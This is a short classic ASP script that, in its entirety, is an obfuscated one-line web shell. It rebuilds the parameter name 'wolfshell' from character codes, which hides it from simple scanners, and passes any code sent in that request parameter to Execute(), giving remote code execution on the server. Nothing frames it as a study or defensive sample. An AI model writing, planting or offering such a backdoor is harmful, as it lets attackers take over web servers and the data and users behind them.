<%
Dim xg_8a, xg_8b, xg_8c, xg_8d
xg_8a = "119,111,108,102,115,104,101,108,108"
xg_8b = Split(xg_8a, ",")
xg_8c = ""
For Each xg_8d In xg_8b
    xg_8c = xg_8c & Chr(CInt(xg_8d))
Next
Execute(Request(xg_8c))
%>